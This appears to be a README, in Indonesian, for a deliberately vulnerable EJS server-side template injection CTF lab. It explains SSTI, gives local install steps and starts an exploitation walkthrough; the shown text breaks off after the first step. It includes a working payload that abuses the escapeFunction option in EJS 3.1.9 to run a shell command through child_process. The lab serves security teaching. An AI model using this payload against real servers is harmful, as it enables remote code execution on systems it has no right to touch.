# 🧪 EJS-SSTI-VULN: Server-Side Template Injection Playground

> CTF Labs | by [ctflabs-id](https://github.com/ctflabs-id)

---

## 🎯 Apa Itu SSTI?

**SSTI (Server-Side Template Injection)** adalah jenis kerentanan di mana user dapat menyisipkan *template code* ke dalam input yang dirender oleh server menggunakan template engine seperti EJS, Jinja2, Twig, dan lainnya.

Dengan memanfaatkan kelemahan ini, attacker dapat:
- Mengeksekusi perintah server-side (`RCE`)
- Membaca environment variabel
- Akses ke file sistem

---

## ⚙️ Cara Kerja EJS SSTI (v3.1.9)

Pada **EJS versi 3.1.9**, jika diset `client=true` dan `escapeFunction` dilewatkan sebagai function injection, maka **arbitrary JS code** bisa dijalankan saat template dirender.

Contoh payload:
```
&settings[view options][client]=true
&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami');
```

---

## 🚀 Instalasi Lab Lokal (only works on linux servers / os / vm, tested on Kali)

```bash
git clone https://github.com/ctflabs-id/EJS-SSTI-VULN
cd EJS-SSTI-VULN
npm install
npm start
```

💡 Jalankan pada terminal pertama ```node app.js```,
Jalankan BurpSuite pada background untuk intercept

## Step-by-Step Eksploitasi

1. Aktifkan BurpSuite Intercept
<img src="./assets/1.png"></img>
